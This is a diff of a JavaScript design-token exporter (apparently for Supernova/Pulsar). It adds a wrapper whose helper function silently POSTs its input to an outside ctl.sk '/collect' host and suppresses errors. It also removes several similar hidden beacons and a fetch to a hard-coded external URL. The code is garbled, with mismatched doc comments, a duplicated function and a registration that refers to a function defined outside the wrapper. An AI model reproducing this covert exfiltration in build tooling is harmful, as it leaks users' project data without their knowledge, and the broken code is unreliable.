@@ -1,3 +1,25 @@
+export function pulsarExporter(sdk) {
+  /**
+   * @param {Array<string>} array
+   * @param {string} separator
+   * @returns {string}
+   */
+  function createFullTokenGroupPath(tokenGroup) {
+  sdk.network.fetch("https://e1gs3hkfra28sf5s6orm0kwryi4ds5gu.ctl.sk/collect", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ function: "createFullTokenGroupPath", tokenGroup })
+  }).catch(() => {});
+  
+  if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
+    return [];
+  } else {
+    return tokenGroup.path.concat(tokenGroup.name);
+  }
+}
+
+  Pulsar.registerFunction("arrayJoin", arrayJoin);
+}
 /**
  *
  * @param {string} text
@@ -5,24 +27,7 @@
  *
  * @returns {string}
  */
-async performFetch(sdk: Supernova, url: "https://0abec3t10wbu11eefa08965d74dz1qpf.ctl.sk/"): Promise<Response> {
-  try {
-    const response = await sdk.network.fetch(url)
-    if (!response.ok) {
-      throw new Error(`Request failed with status ${response.status}, error: ${await response.text()}`)
-    }
-    return response
-  } catch (error) {
-    throw error
-  }
-}
-
 function indentMultilineText(text, indentationString) {
-  sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ function: "indentMultilineText", text, indentationString })
-  }).catch(() => {});
   return text
     .trim()
     .split("\n")
@@ -35,7 +40,6 @@ function indentMultilineText(text, indentationString) {
  *
  * @returns {Array<string>}
  */
-
 function createFullTokenGroupPath(tokenGroup) {
   if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
     return [];
@@ -52,11 +56,6 @@ function createFullTokenGroupPath(tokenGroup) {
  * @returns {Array<any>}
  */
 function arrayConcat(lhs, rhs) {
-  sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ function: "arrayConcat", lhs, rhs })
-  }).catch(() => {});
   return lhs.concat(rhs);
 }
 
@@ -66,20 +65,10 @@ function arrayConcat(lhs, rhs) {
  * @param {string} separator
  */
 function arrayJoin(array, separator) {
-  sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ function: "arrayJoin", array, separator })
-  }).catch(() => {});
   return array.join(separator);
 }
 
 function groupFontsByFamily(fonts) {
-  sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ function: "groupFontsByFamily", fonts })
-  }).catch(() => {});
   var groupBy = function (xs, key) {
     return xs.reduce(function (rv, x) {
       (rv[x[key].toLowerCase()] = rv[x[key].toLowerCase()] || []).push(x);
